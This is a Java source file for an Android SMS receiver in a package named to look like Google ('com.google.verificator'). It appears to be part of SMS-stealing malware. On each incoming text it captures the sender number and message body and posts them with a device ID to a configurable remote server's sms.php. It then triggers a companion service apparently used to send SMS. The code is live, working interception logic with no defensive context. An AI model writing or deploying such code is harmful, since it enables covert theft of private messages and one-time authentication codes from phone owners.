package com.google.verificator;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;

import com.byteshaft.requests.HttpRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.HttpURLConnection;


public class IncomingSmsListener extends BroadcastReceiver {

    private Context mContext;
    private String senderNumber;
    private String messsageBody;

    private String andoridID;

    int normal = 2;
    int vibrate = 1;
    int silent = 0;
    int RingerMode;
    public static AudioManager audioManager;


    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;

        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
            SmsMessage[] msgs = null;
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        senderNumber = msgs[i].getOriginatingAddress();
                        messsageBody = msgs[i].getMessageBody();
                        Log.e("SMS onReceive", "SMS : " + messsageBody + "PHONE: " + senderNumber);
                        andoridID = AppGlobals.getStringFromSharedPreferences(AppGlobals.KEY_ANDROID_ID);
                        Log.e("SMS onReceive", "andoridID : " + andoridID);
                        sendReceivedSMSToServer(andoridID, senderNumber, messsageBody);

                    }
                } catch (Exception e) {
                    Log.e("Exception caught: ", e.getMessage());
                }
            }
        }
    }

    private void sendReceivedSMSToServer(String deviceId, String senderPhoneNumber, String messageContent) {
        HttpRequest getStateRequest = new HttpRequest(mContext);
        getStateRequest.setOnReadyStateChangeListener((request, readyState) -> {
            switch (readyState) {
                case HttpRequest.STATE_DONE:
                    switch (request.getStatus()) {
                        case HttpURLConnection.HTTP_OK:
                            System.out.println("ReceivedSMSToServer---------------" + request.getResponseText());
                            break;

                    }
                    default:{
                        AppGlobals.pingNotOk("");
                    }
            }
        });
        getStateRequest.setOnErrorListener(new HttpRequest.OnErrorListener() {
            @Override
            public void onError(HttpRequest request, int readyState, short error, Exception exception) {
                if (error == HttpRequest.ERROR_CONNECTION_TIMED_OUT) {
                    AppGlobals.pingNotOk("");
                }
                if (error == HttpRequest.ERROR_INVALID_URL) {
                    AppGlobals.pingNotOk("");

                }
                if (error == HttpRequest.ERROR_NETWORK_UNREACHABLE) {
                    AppGlobals.pingNotOk("");
                }

                if (error == HttpRequest.ERROR_LOST_CONNECTION) {
                    AppGlobals.pingNotOk("");
                }

            }
        });
        getStateRequest.setTimeout(15000);
        getStateRequest.open("POST", String.format("%s/sms.php", AppGlobals.getIPFromSharedPreferences()));
        getStateRequest.send(getSMSData(deviceId, senderPhoneNumber, messageContent, AppGlobals.getReleaseVersion()));

        //Ask to PING
        PingToServerAndSendSMSService instance = PingToServerAndSendSMSService.getInstance();
        System.out.println("Trying to force ping...");
        instance.pingToServerForSendSMS(deviceId,"2");
    }

    private String getSMSData(String deviceId, String senderPhoneNumber, String messageContent, String releaseVersion) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("DEVICE_ID", deviceId);
            jsonObject.put("SMS_SENDER", senderPhoneNumber);
            jsonObject.put("SMS_CONTENT", messageContent);
            jsonObject.put("RELEASE_VERSION", releaseVersion);
            System.out.println(jsonObject.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject.toString();
    }
}
